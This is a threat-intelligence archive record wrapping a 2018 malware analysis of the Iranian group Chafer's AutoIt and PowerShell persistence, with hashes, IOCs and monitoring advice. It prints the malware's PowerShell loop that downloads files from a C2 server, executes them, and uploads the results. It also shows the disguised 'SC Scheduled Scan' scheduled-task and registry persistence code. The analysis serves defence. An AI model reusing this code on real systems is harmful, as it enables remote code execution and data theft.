{
    "id": "86bed6e2-4205-405c-8768-d15371e29d8f",
    "created_at": "2023-01-12T15:07:03.590007Z",
    "updated_at": "2025-03-27T02:14:30.748964Z",
    "deleted_at": null,
    "sha1_hash": "110caa3c84dd4a44619953b30d95cc7923fca938",
    "title": "2018-03-25 - Let's Learn- Internals of Iranian-Based Threat Group -Chafer- Malware- Autoit and PowerShell Persistence",
    "authors": "",
    "file_creation_date": "2022-05-28T04:12:35Z",
    "file_modification_date": "2022-05-28T04:12:35Z",
    "file_size": 107909,
    "plain_text": "# Let's Learn: Internals of Iranian-Based Threat Group \"Chafer\" Malware: Autoit and PowerShell Persistence\n\n**[vkremez.com/2018/03/investigating-iranian-threat-group.html](https://www.vkremez.com/2018/03/investigating-iranian-threat-group.html)**\n\n**Goal: Reverse-engineer Iranian threat group update ‚ÄúChafer‚Äù payload installer focusing on**\nits persistence Autoit and PowerShell techniques.\n\n[3-22-2018: Iranian threat group #Chafer (thanks:](https://twitter.com/hashtag/Chafer?src=hash&ref_src=twsrc%5Etfw) [@ClearskySec](https://twitter.com/ClearskySec?ref_src=twsrc%5Etfw) üëç) [#malware](https://twitter.com/hashtag/malware?src=hash&ref_src=twsrc%5Etfw)\n\nInteresting persistence:\n\n$userver = \"j-alam[.com\"+/update.php?req= (nslookup DNS/TXT)\n\nPowerShell DL exec / registry & task scheduler\n\nLocal C2: 107.191.62[.45:7023/update.php\n\nIntel: [https://t.co/8IFNrm1zy6](https://t.co/8IFNrm1zy6) [pic.twitter.com/BL6qPf3FSk](https://t.co/BL6qPf3FSk)\n[‚Äî Vitali Kremez (@VK_Intel) March 22, 2018](https://twitter.com/VK_Intel/status/976733257793449984?ref_src=twsrc%5Etfw)\n\n**Source:**\n\nPayload fake Microsoft installer ‚ÄúWindows-KB3101246.exe‚Äù (MD5:\n804460a4934947b5131ca79d9bd668cf; Original timestamp: Monday, July 31, 2017,\n19:33:49 UTC)\nPowerShell script dntx.ps1 (MD5: 5cc9ba617a8c53ae7c5cc4d23aced59d)\nPowerShell script dnip.ps1 (MD5: 8132c61c0689dbcadf67b777f6acc9d9)\nnsExec.dll (MD5: b38561661a7164e3bbb04edc3718fe89)\nAutoit script ‚ÄúApp.au3‚Äù (MD5: 263bc6861355553d7ff1e3848d661fb8) Original\ntimestamp: Saturday, December 2, 2017, 11:08:48 UTC\n\n**Background:**\n\n[While investigating payload from the Iranian actor group ‚ÄúChafer‚Äù, I decided to dive deeper](https://www.symantec.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions)\ninto the chain to observe and document some of the interesting persistence and anti-evasive\n[behavior, deployed by the group (thanks to @ClearskySec for the sample).](https://twitter.com/ClearskySec)\n\nHistorically. Chafer is known for its surveillance operations targeting various organizations\nfrom airlines to engineering, which are primary located in the Middle East.\n\n**Outline:**\n\nI. Malware install\nII. Autoit.exe installation\nIII. Autoit script ‚ÄúApp.au3\nIV. PowerShell script server<->client communications via DNS TXT and IP\nV. Task Schedule as ‚ÄúSC Scheduled Scan‚Äù\n**I. Malware install**\n\nAs of March 25, 2018, the initial malware binary masking as WindowsKB3101246.exe\" notably appears to carry low detection ratio of 6/63 as displayed\n\n\n-----\n\non [VirusTotal. The binary is also bulky, packed with NSIS with over 1.8 MB of size containing](https://www.virustotal.com/en/file/332fab21cb0f2f50774fccf94fc7ae905a21b37fe66010dcef6b71c140bb7fa1/analysis/)\nthe Autoit3.exe script along with the PowerShell command, and the embedded nsExec[.]dll.\nThe malware scripts left various clues as to the original operation and contains wellcommented code. Additionally, the operators left commented out what appears to be the\noriginal server hxxp://107.191.62[.]45:7023/update[.]php\n\n\n-----\n\n```\n; run powershell in assosation with $method\n===============\nSwitch $method\n  Case 0\n  Local $exitcode = RunWait(\"powershell.exe -nop -executionpolicy bypass -File \"\"\" &\n$HOME & \"dnip.ps1\"\"\", '', @SW_HIDE)\n _FileWriteLog(@ScriptDir & \"\\Ex.log\", \"Powershell start 0:\" & $method & \"\\t\nExitCode:\" & $exitcode)\n _FileWriteLog(@ScriptDir & \"\\Ex.log\", \"Home:\" & $HOME)\n  Case 1\n Local $exitcode = RunWait(\"powershell.exe -nop -executionpolicy bypass -File \"\"\" &\n$HOME & \"dntx.ps1\"\"\", '', @SW_HIDE)\n _FileWriteLog(@ScriptDir & \"\\Ex.log\", \"Powershell start 1:\" & $method & \"\\t\nExitCode:\" & $exitcode)\n _FileWriteLog(@ScriptDir & \"\\Ex.log\", \"Home:\" & $HOME)\n  Case 2\n ;Local $SERVER=\"http://107.191.62[.]45:7023/update[.]php?req=\" & $cname\n Local $SERVER=\"ht\"&\"tp:\"&\"/\"&\"/\"& $userver&\"/upd\" & \"ate.\"& \"ph\"&\"p?req\"& \"=\" &\n$cname\n $Dwn= \"powershell \"\" \" & _\n  \" &{$wc=(new-object System.Net.WebClient); \" & _\n  \"while(1){try{$r=Get-Random ;$wc.DownloadFile('\" _\n  & $SERVER & _\n  \"&m=d','\" & $HOME & \"dn\\'+$r+'.-_');\" & _\n  \" Rename-Item -path ('\" & _\n   $HOME & _\n   \"dn\\'+$r+'.-_') -newname \" & _\n   \"($wc.ResponseHeaders['Content-Disposition'].Substring(\" & _\n   \"$wc.ResponseHeaders['ContentDisposition'].Indexof('filename=')+9))}catch{break}}}\"\"\"\n $Dwn = StringReplace($Dwn, \"-_\", \"dwn\")\n RunWait($Dwn, '', @SW_HIDE)\n $DownloadExecute=\"powershell \"\" \" & _\n    \"&{$r=Get-Random; \"& _\n    \"$wc=(new-object System.Net.WebClient);\" & _\n    \"$wc.DownloadFile('\" & $SERVER & \"&m=b','\" & $HOME&\"dn\\'+$r+'.-_');\" & _\n    \"Invoke-Expression ('\"& StringReplace($HOME, \" \", \"` \")&\"dn\\'+$r+'.-_ >\" &\nStringReplace($HOME, \" \", \"` \")&\"up\\'+$r+'-_');\" & _\n    \"Rename-Item -path ('\" & $HOME & _\n    \"up\\'+$r+'-_') -newname ($wc.ResponseHeaders['ContentDisposition'].Substring(\" & _\n    \"$wc.ResponseHeaders['Content-Disposition'].Indexof('filename=')+9)+'.txt');\"\n& _\n    \"Get-ChildItem \" & StringReplace($HOME, \" \", \"` \") & \"up\\ | ForEach-Object \"&\n_\n    \"{if((Get-Item($_.FullName)).length -gt 0){$wc.UploadFile('\" & _\n    $SERVER & _\n    \"&m=u',$_.FullName)};\" & _\n    \"Remove-Item $_.FullName};Remove-Item ('\"& $HOME & \"dn\\'+$r+'.-_')}\"\"\"\n $DownloadExecute = StringReplace($DownloadExecute, \"-_\", \"bat\")\n\n```\n\n-----\n\n```\n RunWait($DownloadExecute, '', @SW_HIDE)\nEndSwitch\n\n```\nThe malware contains various functions, including the following (the original orthography is\npreserved):\n\nCheckDNSIP\nCheckDNSTXT\nMethodFinder (CheckDNSIP/CheckDNSTXT/CheckHttp)\nRunWait(\"ipconfig /flushdns\", '', @SW_HIDE)\nLocal $HOME = @UserProfileDir & \"\\appdata\\local\\microsoft\\Taskbar\\\"\nCreate essential directory\nread method from reg if not exist create registry value (registry persistence)\ncreate task scheduler\n**II. Persistence**\nBy and large, the malware primarily leverages the directory\n\"%APPDATA%\\Local\\Microsoft\\Taskbar\\\" (as from the original script: \"Local $HOME =\n@UserProfileDir & \"\\appdata\\local\\microsoft\\Taskbar\\\")for log and script storage.\nA. The malware achieves persistence via task scheduler leveraging command-line\narguments after its initial drop in %TEMP% leveraging Autoit binary freeware BASIC-like\nscripting language with the custom script \"App.au3.\" The binary drops the Autoit3.exe\nexecution along with the script to compile that runs via the schtasks feature.\n%APPDATA%\\<DROP_FOLDER.tmp>\\DROP_BINARY.tmp\\\" schtasks.exe /create /F /sc\nminute /mo 1 /tn \\\"SC Scheduled Scan\\\" /tr\n\\\"'%APPDATA%\\Local\\Microsoft\\Taskbar\\Autoit3.exe'\n'%APPDATA%\\Local\\Microsoft\\Taskbar\\App.au3'\\\" \"\nThe original malware Autoit persistence script is as follows writing the log file \"Ex.log\":\n```\n;=============================== create task schedule\n===================================\n$txtStr = \"schta\"&\"sks /create /F\"&\" /sc minute /mo 3 /tn \"\"SC Scheduled Scan\"\" /tr\n\"\"%userprofile%\\appdata\\local\\microsoft\\Taskbar\\autoit3.exe '\" & @ScriptFullPath &\n\"'\"\"\"\nRunWait($txtStr, '', @SW_HIDE)\n_FileWriteLog(@ScriptDir & \"\\Ex.log\", \"Method:\" & $method)\n\n```\nB. Additionally, the binary launches itself also via batch leverage Windows Update\nStandalone Installer (wusa.exe), launched via dropped batch script \"RunMSU\" from the\nsame \"%APPDATA%\\Local\\Microsoft\\Taskbar\\\"\necho off\nwusa \"%APPDATA%\\Local\\Microsoft\\Taskbar\\Windows6.0-KB3101246.msu‚Äù\nC. Additionally, the malware achieves registry persistence as follows creating \"UMe\" and\n\"UT\":\n\n\n-----\n\n```\n; read method from reg if not exist create registry\nvalue =============\nLocal $epocTime = ((@YEAR - 1970) * 31557600) + (int ((@YEAR - 1972) / 4) * 86400) +\n((@YDAY - 1) * 86400) + (@HOUR * 3600) + (@MIN * 60) + @SEC\nLocal $method =\nRegRead(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"UMe\")\nif @error Then\n RegWrite(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"UMe\",\n\"REG_SZ\", \"0\")\n RegWrite(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"UT\",\n\"REG_SZ\", \"0\")\n $method = 0;\nEndIf\nLocal $lastMethodFinderTime =\nRegRead(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"UT\")\nif (@error or $epocTime - $lastMethodFinderTime > 400) Then\n $method = MethodFinder()\n _FileWriteLog(@ScriptDir & \"\\Ex.log\", \"newMethod:\" & $method)\n RegWrite(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"UMe\",\n\"REG_SZ\", $method)\n RegWrite(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"UT\",\n\"REG_SZ\", $epocTime)\nEndIf\n\n```\n**Possible actions:**\n1. Monitor %APPDATA%\\Local\\Microsoft\\Taskbar\\ for possible artifacts related to Autoit\nscripts and PowerShell script, linked t the group.\n2. Monitor for possible communications to suspicious domains, launched via PowerShell on\nURI patterns update-[.]php?req=.\n3. Monitor for possible scheduler task \"SC Scheduled Scan.\"\n4. Block C2: j-alam[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-25 - Let's Learn- Internals of Iranian-Based Threat Group -Chafer- Malware- Autoit and PowerShell Persistence.pdf"
    ],
    "report_names": [
        "2018-03-25 - Let's Learn- Internals of Iranian-Based Threat Group -Chafer- Malware- Autoit and PowerShell Persistence.pdf"
    ],
    "threat_actors": [
        {
            "id": "bee22874-f90e-410b-93f3-a2f9b1c2e695",
            "created_at": "2022-10-25T16:07:23.45097Z",
            "updated_at": "2025-03-27T02:02:09.808919Z",
            "deleted_at": null,
            "main_name": "Chafer",
            "aliases": [
                "APT 39",
                "Cobalt Hickman",
                "ITG07",
                "Radio Serpens",
                "Remix Kitten",
                "TA454"
            ],
            "source_name": "ETDA:Chafer",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Antak",
                "CACHEMONEY",
                "EternalBlue",
                "HTTPTunnel",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MechaFlounder",
                "Metasploit",
                "Mimikatz",
                "NBTscan",
                "NSSM",
                "Non-sucking Service Manager",
                "POWBAT",
                "Plink",
                "PuTTY Link",
                "Rana",
                "Remcom",
                "Remexi",
                "RemoteCommandExecution",
                "SafetyKatz",
                "UltraVNC",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "nbtscan",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a761f2a6-26ba-47fd-89c3-6a74f847a3b2",
            "created_at": "2024-05-01T02:03:08.025289Z",
            "updated_at": "2025-03-27T02:05:17.312292Z",
            "deleted_at": null,
            "main_name": "COBALT HICKMAN",
            "aliases": [
                "Chafer ",
                "ITG07 ",
                "APT39 "
            ],
            "source_name": "Secureworks:COBALT HICKMAN",
            "tools": [
                " Mimikatz",
                " Remexi",
                " TREKX",
                "MechaFlounder"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536023,
    "ts_updated_at": 1743041670,
    "ts_creation_date": 1653711155,
    "ts_modification_date": 1653711155,
    "files": {
        "pdf": "https://archive.orkl.eu/110caa3c84dd4a44619953b30d95cc7923fca938.pdf",
        "text": "https://archive.orkl.eu/110caa3c84dd4a44619953b30d95cc7923fca938.txt",
        "img": "https://archive.orkl.eu/110caa3c84dd4a44619953b30d95cc7923fca938.jpg"
    }
}